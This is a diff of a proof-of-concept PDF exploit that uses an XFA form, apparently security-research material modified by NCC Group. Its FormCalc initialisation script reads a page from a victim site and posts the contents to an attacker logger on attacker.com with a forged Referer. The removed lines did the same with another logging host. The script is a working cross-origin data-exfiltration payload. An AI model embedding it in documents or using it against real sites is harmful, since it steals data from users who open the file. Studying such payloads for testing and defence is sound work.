@@ -1,7 +1,7 @@
 % a PDF file using an XFA
 % Ange Albertini BSD Licence 2012
 % http://insert-script.blogspot.co.at/2014/12/multiple-pdf-vulnerabilites-text-and.html
-% Modified by NCC Group
+% Modified by NCC Group - v1.1
 %PDF-1. % can be truncated to %PDF-\0
 1 0 obj <<>>
 stream
@@ -15,8 +15,8 @@ stream
             <event activity="initialize">
 			<script contentType='application/x-formcalc'>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Change This Section;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-					var content = Get("http://example.com/sensitivepage.php"); // PDF reads this page
-		            Post("http://15.rs/logger/logger.php",content); // Attacker hijack the data
+					var content = Get("http://victim.com/sensitive.aspx"); // PDF reads this page
+					Post("http://attacker.com/logger.php",content, "application/x-www-form-urlencoded", "utf-8", "Referer: http://www.victim.com/"); // Attacker hijacks the data
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;				
                 </script>	
             </event>
